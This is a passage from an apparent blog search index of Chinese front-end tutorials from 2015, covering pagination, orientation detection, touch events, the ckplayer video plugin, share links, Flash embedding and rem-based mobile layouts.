$("html,body").animate(&#123;scrollTop:0&#125;, 500); //最后，给当前页码加1 $('#jiazai').val(Number(bianlaing)+Number(1)); &#125;&emsp;&emsp;好了，到这里分页就完成了，如果你们需要使用的话，可能会话费一会去理解我的代码，其实代码不难，我是使用了两个小时把它写完的，只要一行一行代码看，并且自己再加注释，把这块弄过去，不出半小时绝对搞定！]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js分页</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS禁止横竖屏切换,强制横竖屏显示]]></title>
    <url>%2F2015%2F08%2F26%2Fjs%E7%A6%81%E6%AD%A2%E6%A8%AA%E7%AB%96%E5%B1%8F%E5%88%87%E6%8D%A2%E5%BC%BA%E5%88%B6%E6%A8%AA%E7%AB%96%E5%B1%8F%E6%98%BE%E7%A4%BA%2F</url>
    <content type="text"><![CDATA[js判断屏幕横竖屏：123456789101112131415161718192021function orient() &#123; //alert('gete'); if (window.orientation == 0 || window.orientation == 180) &#123; $("body").attr("class", "portrait"); orientation = 'portrait'; return false; &#125; else if (window.orientation == 90 || window.orientation == -90) &#123; $("body").attr("class", "landscape"); orientation = 'landscape'; return false; &#125; &#125; $(function()&#123; orient(); &#125;); $(window).bind( 'orientationchange', function(e)&#123; orient(); &#125;);ipad： 90 或 -90 横屏ipad： 0 或180 竖屏Andriod：0 或180 横屏Andriod： 90 或 -90 竖屏iphone 、ipad禁止横竖屏切换、强制横竖屏]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>JS禁止横竖屏切换</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ckplayer.js视频播放插件之微信播放视频]]></title>
    <url>%2F2015%2F08%2F26%2Fckplayer-js%E8%A7%86%E9%A2%91%E6%92%AD%E6%94%BE%E6%8F%92%E4%BB%B6%E4%B9%8B%E5%BE%AE%E4%BF%A1%E6%92%AD%E6%94%BE%E8%A7%86%E9%A2%91%2F</url>
    <content type="text"><![CDATA[作为一名前端开发，在做页面时会碰到视频展示，一般都是用 flash 加载视频源文件，可惜功能太少，而且支持的视频格式有限。下面给大家分享一款不错的视频播放器——ckplayer（超酷网页视频播放器）。ckplayer（超酷网页视频播放器）支持 http 协议下的 flv，f4v，mp4，支持 rtmp 视频流和 rtmp 视频回放，支持 m3u8 格式，是你做视频直播，视频点播的理想播放器。功能强，小巧，免费。网页中常见的功能就是播放视频，下面介绍的这个ckplayer.js既可以在pc端播放，也可以在手机网页上播放。可调用flash也可以调用html5播放器：1234567891011&lt;div id="a1"&gt;&lt;/div&gt;&lt;script type="text/javascript" src="ckplayer/ckplayer.js" charset="utf-8"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;var flashvars=&#123;f:'http://movie.ks.js.cn/flv/other/1_0.mp4',c:0,loaded:'loadedHandler'&#125;;var video=['http://movie.ks.js.cn/flv/other/1_0.mp4-&gt;video/mp4'];CKobject.embed('ckplayer/ckplayer.swf','a1','ckplayer_a1','600','400',false,flashvars,video);&lt;/script&gt;CKobject.embed(‘flash播放器文件路径’,‘容器ID’,‘播放器的ID’,‘宽度，可以是百分比’,‘高度，可以是百分比’,优先调用设置，false=优先调用flash播放器，true=优先调用HTML5播放器flash播放器的初始化参数，以及HTML5初始化参数，比如默认播放/暂停等设置，详细的可以参考【flashvars里各参数的说明】这一版块HTML5视频播放地址，数组形式，详细的可参考HTML5视频调用的说明)只调用flash播放器：1234567891011&lt;div id="a1"&gt;&lt;/div&gt;&lt;script type="text/javascript" src="ckplayer/ckplayer.js" charset="utf-8"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;var flashvars=&#123;f:'http://movie.ks.js.cn/flv/other/1_0.flv',c:0,b:1&#125;;var params=&#123;bgcolor:'#FFF',allowFullScreen:true,allowScriptAccess:'always',wmode:'transparent'&#125;;CKobject.embedSWF('ckplayer/ckplayer.swf','a1','ckplayer_a1','600','400',flashvars,params);&lt;/script&gt;CKobject.embedSWF(‘flash播放器路径’,‘放置播放器的容器ID’,‘播放器的ID’,‘宽度，支持百分比’,‘高度，支持百分比’,flashvars对象，初始化播放器参数,相关的配置，如：背景色，是否允许全屏，是否允许交互，播放器是否透明);&nbsp;只调用HTML5播放器：1234567891011&lt;div id="a1"&gt;&lt;/div&gt;&lt;script type="text/javascript" src="ckplayer/ckplayer.js" charset="utf-8"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;var flashvars=&#123;p:1,e:1&#125;;var video=['http://movie.ks.js.cn/flv/other/1_0.mp4-&gt;video/mp4','http://www.ckplayer.com/webm/0.webm-&gt;video/webm','http://www.ckplayer.com/webm/0.ogv-&gt;video/ogg'];var support=['all'];CKobject.embedHTML5('a1','ckplayer_a1',600,400,video,flashvars,support);&lt;/script&gt;CKobject.embedHTML5(‘放置播放器的容器的ID’,‘播放器ID’,‘宽高，支持百分比’,‘高度，支持百分比’,视频地址，数组，因为不同的平台支持的视频格式不同，所以需要尽量多的视频格式来兼容,初始化配置参数，比如默认是否播放,在哪些平台上使用，all是指全部平台都调用);&nbsp;其中1234567891011121314151617181920212223242526/**注意，flashvars中的参数：v：ckplayer_volume，视频默认音量 0-100 之间，默认为 85。p：ckplayer_play，是否自动播放，可以为 1 或 0，默认为 1，参数不为 1 时播放器加载完成后均为暂停状态。f：ckplayer_flv，视频地址，默认为空，可以是单独视频地址、url 地址列表文件、xml 地址列表文件、Flash 地址文件这四种情况。（注意对应修改 s 参数的值，即 ckplayer_style）i：ckplayer_loadimg，视频播放器初始图片地址，即封面图片，默认为空。d：ckplayer_pauseflash，暂停时播放的广告，只支持 Flash 和图片，默认为空。u：ckplayer_pauseurl，暂停时播放广告图片的链接地址，默认为空。l：ckplayer_loadadv，视频开始前播放的广告，可以是 图片/Flash/视频格式，默认为空。r：ckplayer_loadurl，视频开始前广告的链接地址，主要针对视频广告，如果是 Flash 广告可以不填写，默认为空。t：ckplayer_loadtime，视频开始前广告播放的秒数，只针对 Flash 或图片有效，默认为 0。e：ckplayer_endstatus，视频结束后的动作，0 停止播放并发送js，1 是不发送 js 且重新循环播放，2 停止播放，默认为2。当为 0 时需要自定义函数：function playerstop()&#123;alert(&quot;播放完成&quot;);&#125;a：ckplayer_pat，只有在使用 Flash 加密地址传递时有效，需要 f 和 s 参数配合，以及你自定义的 geturl.swf 文件配合，f：ckplayer_flv 参数也可以为 getflv.php?id=[$pat] 这样的格式，相当于 Flash 加密地址传递，其中的 pat 是有效的,可以通过这里传递参数后得到视频播放地址给播放器。s：ckplayer_style，f 参数的传递方式，0 是普通视频地址，1 是视频地址列表文件，2 是 xml 地址列表文件，3 是 Flash 加密地址解析，默认为 0 普通视频地址文件播放。x：ckplayer_xml，皮肤配置文件，如果为空的话将使用 js 文件配置，默认为官方皮肤 ckplayer.xml，要修改为其他皮肤只需要下载后改这个文件名就可以了，比如网易皮肤 ckplayer_163.xml。c：ckplayer_default，读取文本配置，此参数具有非常强大的功能，非 0 值时调用本地 ckplayer.txt 配置文件（比如外站引用视频只需一个参数即可）说来话长，请到网站了解详情。b：ckplayer_bgcolor，该参数以适应站外调用时有些论坛自动设置透明度的问题。h：ckplayer_http，默认为0，定义 http 视频流采用按关键帧拖动还是按关键时间点拖动，0是按关键帧，1是按关键时间点。m：ckplayer_load，默认为0，为1时不自动加载视频，选择是否采用点击播放按钮时再加载视频，这个参数的功能是在同页面加载多个视频时，有些视频可以先不加载，省带宽。g：ckplayer_start，默认为0，开头跳过时间，这两个参数可以定义按指定时间进行播放的功能和提前结束的功能，该功能的用处一是可以记录用户已播放到的时间下次打开该视频时直接从指定时间进行播放,二是可以做跳过片头和片尾的功能。j：ckplayer_ending，同上，默认为0，提前结束时间。o：附加参数，非 CKplayer 官方参数，可选，默认值为 0，当值为 1 时，可加载站外视频 Flash 地址，如优酷分享中的 Flash 地址等，相当于使用 &lt;embed width=&quot;300&quot; height=&quot;150&quot;&gt;&lt;/embed&gt; 标签加载站外 Flash 视频。**/下面贴一个实例代码：html代码：1&lt;div id="video_c"&gt;&lt;/div&gt;css代码：1#video_c&#123; width:840px; height:353px;margin:0 auto;&#125;js代码：123456789101112&lt;script type="text/javascript" src="ckplayer/ckplayer.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;var flashvars=&#123;f:'ckplayer/video/1_0.flv',p:0//i：'http://www.ckplayer.com/static/images/letitgo.jpg' //视频播放器初始图片地址，即封面图片，默认为空。&#125;;var video=['ckplayer/video/1_0.mp4-&gt;video/mp4'];CKobject.embed('ckplayer/ckplayer.swf','video_c','ckplayer_a1','100%','100%',false,flashvars,video);&lt;/script&gt;结果截图如下如下：相关地址：官网地址：http://www.ckplayer.com/下载地址：http://www.ckplayer.com/bbs/forum.php?mod=viewthread&amp;tid=10864帮助手册：http://www.ckplayer.com/tool/使用示例：http://www.ckplayer.com/article/19.htm在线配置：http://www.ckplayer.com/tool/flashvars.htm论坛地址：http://www.ckplayer.com/bbs/forum.php]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>ckplayer.js视频播放插件</tag>
        <tag>微信播放视频</tag>
        <tag>微信播放视频插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[oninput,onpropertychange,onchange的基本知识以及应用]]></title>
    <url>%2F2015%2F08%2F26%2Foninputonpropertychangeonchange%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E4%BB%A5%E5%8F%8A%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[onchange触发事件必须满足两个条件：a）当前对象属性改变，并且是由键盘或鼠标事件激发的（脚本触发无效）b）当前对象失去焦点(onblur)；&nbsp;onpropertychange与oninput只要当前对象属性发生改变，都会触发事件，但是它是IE专属的；oninput是onpropertychange的非IE浏览器版本，支持firefox和opera等浏览器，但有一点不同，它绑定于对象时，并非该对象所有属性改变都能触发事件，它只在对象value值发生改变时奏效。在textarea中，如果想捕获用户的键盘输入，用onkeyup检查事件就可以了，但是onkeyup并不支持复制和粘贴，因此需要动态监测textarea中值的变化，这就需要onpropertychange（用在IE浏览器）和oninput（非IE浏览器）结合在一起使用了。&nbsp;onpropertychange的bug在代码实现时，发现在响应用户onclick了textarea时，如果使用obj.className=”XX”;来改变textarea输入框中字体的样式，会导致在ie下会有在输入第一个字符的时候onpropertychange不会触发的bug，因此需要这样设置：obj.style.color=”#000”;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>onchange</tag>
        <tag>oninput</tag>
        <tag>onpropertychange</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端中如何检测设备方向的变化？]]></title>
    <url>%2F2015%2F08%2F26%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%B8%AD%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%E8%AE%BE%E5%A4%87%E6%96%B9%E5%90%91%E7%9A%84%E5%8F%98%E5%8C%96%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;除非你的应用程序限定了只在移动设备直立状态或水平状态下使用，一般情况下，你需要调整一些设定。即便你设计的布局流畅时尚，你可能需要改变某些编程代码。通常有以下一些小的策略用于检测移动设备方向的改变。orientationchange事件你等待一个移动API，一个简单的窗口orientationchange事件：12345// 监听方向的改变window.addEventListener("orientationchange", function() &#123;// 宣布新方向的数值alert(window.orientation);&#125;, false);&emsp;&emsp;发生改变的时候， window.orientation属性就改变。值为0表示直立, 90表示设备水平旋转到左边, -90表示设备水平旋转到右边。调整大小事件有些设备不支持orientationchange事件，但可以触发resize事件：1234// 监听调整大小的改变window.addEventListener("resize", function() &#123;// 得到屏幕尺寸 (内部/外部宽度，内部/外部高度)&#125;, false);跟orientationchange事件比起来较不明显，但也是很好用的。屏幕尺寸有一些属性可以从window对象恢复，以获取屏幕尺寸及我认为的“虚拟”屏幕大小：外部宽度，外部高度：真正不动的象素（而不是320×356iPhone直立像素）内部宽度，内部高度：虚拟不动的象素（而不是320×356iPhone直立像素）当然，这些数据不能告诉你方向的变化，需要通过简答的数学计算，你就知道现在的窗口状态是更宽了还是更高了。媒体查询你还可以通过CSS媒体查询判定方向：12345678/* portrait */@media screen and (orientation:portrait) &#123;/* portrait-specific styles */&#125;/* landscape */@media screen and (orientation:landscape) &#123;/* landscape-specific styles */&#125;&emsp;&emsp;更聪明的做法是，用JavaScript编写一个循环的”watcher” ，用以检查一个块的背景颜色，并触发你自己的方向改变。匹配媒体&emsp;&emsp;本地window.matchMedia方法允许实时媒体查询。我们可以利用以上媒体查询找到我们是处于直立或水平视角：12345678910111213141516171819// 寻找匹配var mql = window.matchMedia("(orientation: portrait)");// 如果有匹配，则我们处于垂直视角if(mql.matches) &#123;// 直立方向&#125; else &#123;//水平方向&#125;// 添加一个媒体查询改变监听者mql.addListener(function(m) &#123;if(m.matches) &#123;// 改变到直立方向&#125;else &#123;// 改变到水平方向&#125;&#125;);&nbsp;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>检测设备方向</tag>
        <tag>移动端检测设备方向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端JS 触摸事件基础]]></title>
    <url>%2F2015%2F08%2F26%2F%E7%A7%BB%E5%8A%A8%E7%AB%AFjs-%E8%A7%A6%E6%91%B8%E4%BA%8B%E4%BB%B6%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[一、手机上的触摸事件基本事件：touchstart //手指刚接触屏幕时触发touchmove //手指在屏幕上移动时触发touchend //手指从屏幕上移开时触发下面这个比较少用：touchcancel //触摸过程被系统取消时触发每个事件都有以下列表，比如touchend的targetTouches当然是 0 咯：touches //位于屏幕上的所有手指的列表targetTouches //位于该元素上的所有手指的列表changedTouches //涉及当前事件的所有手指的列表每个事件有列表，每个列表还有以下属性：其中坐标常用pageX,pageY：pageX //相对于页面的 X 坐标pageY //相对于页面的 Y 坐标clientX //相对于视区的 X 坐标clientY //相对于视区的 Y 坐标screenX //相对于屏幕的 X 坐标screenY //相对于屏幕的 Y 坐标identifier // 当前触摸点的惟一编号target //手指所触摸的 DOM 元素其他相关事件：event.preventDefault（） //阻止触摸时浏览器的缩放、滚动条滚动var supportTouch = “createTouch” in document //判断是否支持触摸事件二、示例&emsp;&emsp;以下是获取不同类型滑动的代码具体做法，结合前人的思想，封装好了，可以借鉴学习：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051var touchFunc = function(obj,type,func) &#123;//滑动范围在5x5内则做点击处理，s是开始，e是结束var init = &#123;x:5,y:5,sx:0,sy:0,ex:0,ey:0&#125;;var sTime = 0, eTime = 0;type = type.toLowerCase();obj.addEventListener("touchstart",function()&#123;sTime = new Date().getTime();init.sx = event.targetTouches[0].pageX;init.sy = event.targetTouches[0].pageY;init.ex = init.sx;init.ey = init.sy;if(type.indexOf("start") != -1) func();&#125;, false);obj.addEventListener("touchmove",function() &#123;event.preventDefault();//阻止触摸时浏览器的缩放、滚动条滚动init.ex = event.targetTouches[0].pageX;init.ey = event.targetTouches[0].pageY;if(type.indexOf("move")!=-1) func();&#125;, false);obj.addEventListener("touchend",function() &#123;var changeX = init.sx - init.ex;var changeY = init.sy - init.ey;if(Math.abs(changeX)&gt;Math.abs(changeY)&amp;amp;&amp;amp;Math.abs(changeY)&gt;init.y) &#123;//左右事件if(changeX &gt; 0) &#123;if(type.indexOf("left")!=-1) func();&#125;else&#123;if(type.indexOf("right")!=-1) func();&#125;&#125;else if(Math.abs(changeY)&gt;Math.abs(changeX)&amp;amp;&amp;amp;Math.abs(changeX)&gt;init.x)&#123;//上下事件if(changeY &gt; 0) &#123;if(type.indexOf("top")!=-1) func();&#125;else&#123;if(type.indexOf("down")!=-1) func();&#125;&#125;else if(Math.abs(changeX) 300) &#123;if(type.indexOf("long")!=-1) func(); //长按&#125;else &#123;if(type.indexOf("click")!=-1) func(); //当点击处理&#125;&#125;if(type.indexOf("end")!=-1) func();&#125;, false);&#125;;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端触摸事件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[页面分享代码share]]></title>
    <url>%2F2015%2F08%2F24%2F%E9%A1%B5%E9%9D%A2%E5%88%86%E4%BA%AB%E4%BB%A3%E7%A0%81share%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在开发一个页面的时候常常会有这么一个小功能，就是分享该页面中的信息。&emsp;&emsp;常见的分享代码有百度分享， JiaThis分享插件，bshare分享插件等，我主要分享一下自定义分享代码，如下：12345678910111213141516171819202122232425262728function dofristshare(type) &#123;var title = encodeURIComponent("新年快乐,马年吉祥");var link = encodeURIComponent('http://www.baidu.com');var image = encodeURIComponent('http://www.baidu.com/img/bdlogo.gif');if (type == "sina") &#123;window.open("http://v.t.sina.com.cn/share/share.php?url=" + link + "&amp;amp;title=" + title + "&amp;amp;content=utf8&amp;amp;pic=" + image);&#125;if (type == "tx") &#123;window.open("http://v.t.qq.com/share/share.php?url=" + link + "&amp;amp;title=" + title + "&amp;amp;pic=" + image);&#125;if (type == "qzone") &#123;window.open("http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=" + link + "&amp;amp;title=" + title + "&amp;amp;pics=" + image);&#125;if (type == "rr") &#123;window.open("http://widget.renren.com/dialog/share?resourceUrl=" + link + "&amp;amp;title=" + title + "&amp;amp;pic=" + image);&#125;if (type == "douban") &#123;window.open("http://www.douban.com/recommend/?url=" + link + "&amp;amp;title=" + title + "&amp;amp;image=" + image);&#125;return false;&#125;htm代码：1234567891011&lt;div class="share_top_style"&gt;&lt;a href="javascript:void()" class="" onClick="dofristshare('sina')"&gt;&lt;img src="images/sina.png" alt="新浪微博"&gt;&lt;/a&gt;&lt;a href="javascript:void()" class="" onClick="dofristshare('tx')"&gt;&lt;img src="images/tx.png" alt="腾讯微博"&gt;&lt;/a&gt;&lt;a href="javascript:void()" class="" onClick="dofristshare('rr')"&gt;&lt;img src="images/rr.png" alt="人人网"&gt;&lt;/a&gt;&lt;a href="javascript:void()" class="" onClick="dofristshare('qzone')"&gt;&lt;img src="images/qq.png" alt="QQ空间"&gt;&lt;/a&gt;&lt;a href="javascript:void()" class="" onClick="dofristshare('douban')"&gt;&lt;img src="images/db.png" alt="豆瓣"&gt;&lt;/a&gt;&lt;/div&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>分享代码share</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网页中插入FLASH（swf文件），并且让Flash不遮挡HTML元素]]></title>
    <url>%2F2015%2F08%2F24%2F%E7%BD%91%E9%A1%B5%E4%B8%AD%E6%8F%92%E5%85%A5flash%EF%BC%88swf%E6%96%87%E4%BB%B6%EF%BC%89%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%AE%A9flash%E4%B8%8D%E9%81%AE%E6%8C%A1html%E5%85%83%E7%B4%A0%2F</url>
    <content type="text"><![CDATA[一：网页中插入flash代码如下：&emsp;&emsp;当然里面的很多属性可以去掉，根据具体的需求而定。我们在网页中经常遇到播放flash，要正常播放flash就要用到OBJECT和EMBED这两个标签。鉴于火狐及IE等不同浏览器厂商的不兼容性。播放flash也不相同。OBJECT标签：用于windows平台的IE浏览器，利用Activex控件来播放flash。EMBED标签：用于windows和Macintosh平台下的NetscapeNavigator浏览器，使用Netscape插件技术来播放flash。为了兼容各浏览器我们通常这样写，如例：123456789101112131415161718192021222324&lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="100%" height="100%"codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0"&gt;&lt;param name="movie" value="flash/flash1.swf"&gt;&lt;param name="quality" value="high"&gt;&lt;param name="bgcolor" value="#F0F0F0"&gt;&lt;param name="menu" value="false"&gt;&lt;param name="wmode" value="opaque"&gt;&lt;!--Window|Opaque|Transparent--&gt;&lt;param name="FlashVars" value=""&gt;&lt;param name="allowScriptAccess" value="sameDomain"&gt;&lt;embed id="forfunex" src="flash/flash1.swf"width="100%"height="100%"align="middle"quality="high"bgcolor="#f0fff8"menu="false"play="true"loop="false"FlashVars=""allowScriptAccess="sameDomain"type="application/x-shockwave-flash"pluginspage="http://www.adobe.com/go/getflashplayer" wmode="opaque"&gt;&lt;/embed&gt;&lt;/object&gt;&emsp;&emsp;目的是IE浏览器用OBJECT而会忽略EMBED标签的内容。而火狐等浏览器用EMBED忽略OBJECT等标签内容&nbsp;二：让Flash不遮挡HTML元素&emsp;&emsp;让flash置于DIV层之下的方法，让flash不挡住飘浮层或下拉菜单，让Flash不档住浮动对象或层的关键参数：wmode=opaque。方法如下：针对IE 在name="wmode" value="opaque"link123456针对FF 在```&lt;embed /&gt;```内加上参数wmode=&quot;opaque&quot;其中如果要透明的Flash让Flash透明的关键属性：```&lt;param name=&quot;wmode&quot; value=&quot;transparent&quot;&gt;wmode 属性/参数值 Window | Opaque | Transparent模板变量：$WM，（可选）允许使用 Internet Explorer 4.0 中的透明 Flash 内容、绝对定位和分层显示功能。此标记/属性仅在带有 Flash Player ActiveX 控件的 Windows 中有效。“Window”在 Web 页上用影片自己的矩形窗口来播放应用程序。”Window”表明此 Flash 应用程序与 HTML 层没有任何交互，并且始终位于最顶层。“Opaque” 使应用程序隐藏页面上位于它后面的所有内容。“Transparent”使 HTML 页的背景可以透过应用程序的所有透明部分显示出来，并且可能会降低动画性能。“Opaque windowless”和”Transparent windowless”都可与 HTML 层交互，从而允许 SWF 文件上方的层遮蔽应用程序。这两种选项之间的差异在于”Transparent”允许透明，因此，如果 SWF 文件的某一部分是透明的，则 SWF 文件下方的 HTML 层可以透过该部分显示出来，而”opaque”则不会显示。如果忽略此属性，默认值为 Window。仅适用于 object。&nbsp;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>Flash不遮挡HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3技术:雪碧图自适应缩放]]></title>
    <url>%2F2015%2F08%2F20%2Fcss3%E6%8A%80%E6%9C%AF%E9%9B%AA%E7%A2%A7%E5%9B%BE%E8%87%AA%E9%80%82%E5%BA%94%E7%BC%A9%E6%94%BE%2F</url>
    <content type="text"><![CDATA[ps: 以下实现都是基于移动端的处理原图如下： 人物是采用的是雪碧图，通过坐标绝对数据取值问题很明显，在缩放的屏幕上人物还是按照原尺寸大小显示后来临时留了一节预备的方案：CSS3的scale处理直接可以让元素缩放通过一个缩放的算放控制scale从而让雪碧图的元素可以缩放，目测还是不错。但是这会带一系列的计算问题，因为通过sacle缩放后的元素，在浏览器布局中还是按照原尺寸计算的，所以这样的方案我也是非常的不满意雪碧图常规的方案一般会做几套不同大小的图去适应不同的设备尺寸这里我特指移动端单图的处理，采用的技术很简单CSS3一些知识点先看看原图与处理后的效果&nbsp;来讲解下原理，说白了很简单先观察下矩阵的排量如上是行3 竖3 所以矩阵就是3*3的排列，但是这里只有8张图，怎么处理之后会讲一般想让背景图填充整个元素在css3中可以通过background-size:100% 100%处理显然不能让整图去填充元素，整图填充一个元素就是这效果如何让单图填充一个元素呢? 这里我想到了一个办法，把整图整体缩放，额，就是整体缩放。。。3*3的矩阵，我横竖按照矩形的数量比缩放100%1background-size: 300% 300%;这才是最关键的一步，这样单个元素显示一张图到了这一步估计大家都猜出来了，很简单了，通过百分比去取图了至于精灵动画实现的手段太多了，比如定时器的帧动画，CSS3的animation动画，canvas动画说真的所有的方案我都实现过，包括在移动端上线测试等等目前最为理想的就是通过CSS3关键帧处理动画，如果动画多写一堆的样式就是一个蛋疼的事所以这里我建议可以采用脚本生成关键帧，通过内联style加载，哈哈~~~ 非常完美~刚刚提到了如果3*3的矩阵，但是总数不到9个要如何处理？所以这里我提供一个关键帧的算法给大家参考下，比较简单&nbsp;查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>sprite缩放</tag>
        <tag>sprite自适应</tag>
        <tag>雪碧图缩放</tag>
        <tag>雪碧图自适应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用rem布局手机页面（自适应各种分辨率手机）]]></title>
    <url>%2F2015%2F08%2F20%2F%E4%BD%BF%E7%94%A8rem%E5%B8%83%E5%B1%80%E6%89%8B%E6%9C%BA%E9%A1%B5%E9%9D%A2%E4%B9%8Brem%E5%B8%83%E5%B1%80%E8%87%AA%E9%80%82%E5%BA%94%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;手机页面设计一般的大小是640，但是，手机屏幕大小确实不确定的，这样，怎么才能做出适应所有手机的手机页面呢？&emsp;&emsp;一般的解决方案有两种，rem布局和百分比布局。这两种方案我有都试过，所以现在更推荐用rem布局来制作手机页面;rem布局的兼容性：Mozilla Firefox 3.6+、Apple Safari 5+、Google Chrome、IE9+和Opera11+、ie6-ie8 还是别用rem不过现在的手机一般浏览器，一般可以直接不用去管IE内核的浏览器了。REM的计算公式例:html 设置font-size:16px 1rem = 16px那么640px = 640/16 =40rem个人建议设置为100px 方便计算首先，给页面的html定义一个100px的html{ font-size:100px;}/设定基础rem/然后，最核心的代码就是这一段js运算了，根据页面的大小来控制基础rem的值；1234567891011new function ()&#123;var _self = this;_self.width = 640;//设置默认最大宽度_self.fontSize = 100;//默认字体大小_self.widthProportion = function()&#123;var p = (document.body&amp;amp;&amp;amp;document.body.clientWidth||document.getElementsByTagName("html")[0].offsetWidth)/_self.width;return p&gt;1?1:p&lt;0.5?0.5:p;&#125;;_self.changePage = function()&#123;document.getElementsByTagName("html")[0].setAttribute("style","font-size:"+_self.widthProportion()*_self.fontSize+"px !important");&#125;_self.changePage();window.addEventListener('resize',function()&#123;_self.changePage();&#125;,false);&#125;;demo完整代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0"&gt;&lt;meta charset="utf-8"&gt;&lt;title&gt;rem基础布局&lt;/title&gt;&lt;script type="text/javascript"&gt;new function ()&#123;var _self = this;_self.width = 640;//设置默认最大宽度_self.fontSize = 100;//默认字体大小_self.widthProportion = function()&#123;var p = (document.body&amp;amp;&amp;amp;document.body.clientWidth||document.getElementsByTagName("html")[0].offsetWidth)/_self.width;return p&gt;1?1:p&lt;0.5?0.5:p;&#125;;_self.changePage = function()&#123;document.getElementsByTagName("html")[0].setAttribute("style","font-size:"+_self.widthProportion()*_self.fontSize+"px !important");&#125;_self.changePage();window.addEventListener('resize',function()&#123;_self.changePage();&#125;,false);&#125;;&lt;/script&gt;&lt;style type="text/css"&gt;/*=== base style===*/*&#123;margin: 0px; padding: 0px;&#125;ul&#123;list-style: none;&#125;.wrap&#123;min-width: 320px; max-width: 640px; width: 100%; margin: 0px auto;; background: #2a6ace; font-family:'微软雅黑', 'helvetica neue',tahoma,'hiragino sans gb',stheiti,'wenquanyi micro hei',\5FAE\8F6F\96C5\9ED1,\5B8B\4F53,sans-serif; font-size: 12px;&#125;/*适用于手机端：字体大小用em，1em=16px；为默认字体大小;最大宽度640*/.pro&#123;width:6.2rem; margin: 0px auto; padding-top: 20px; overflow: hidden;&#125;.clearfix:after &#123;content:"";height:0;display:block;clear:both;&#125;.clearfix &#123;zoom:1;&#125;.pro ul&#123;width:6.4rem;&#125;.pro li&#123;width: 3rem; height: 3.6rem; float: left; margin: 0 0.2rem 0.2rem 0;&#125;.pro li .box&#123;width: 3rem; height: 3rem; background: #ccc;&#125;.pro li p&#123;font-size: 0.24rem; line-height: 0.6rem; text-align: center;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="wrap"&gt;&lt;div class="pro"&gt;&lt;ul class="clearfix"&gt;&lt;li&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;p&gt;区块文案&lt;/p&gt; &lt;/li&gt;&lt;li&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;p&gt;区块文案&lt;/p&gt; &lt;/li&gt;&lt;li&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;p&gt;区块文案&lt;/p&gt; &lt;/li&gt;&lt;li&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;p&gt;区块文案&lt;/p&gt; &lt;/li&gt;&lt;li&gt; &lt;div class="box"&gt;&lt;/div&gt; &lt;p&gt;区块文案&lt;/p&gt; &lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&nbsp;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>rem布局手机页面</tag>
        <tag>rem布局自适应</tag>
        <tag>自适应rem</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phaser中文说明文档]]></title>
    <url>%2F2015%2F08%2F20%2Fphaser%E4%B8%AD%E6%96%87%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3%2F</url>
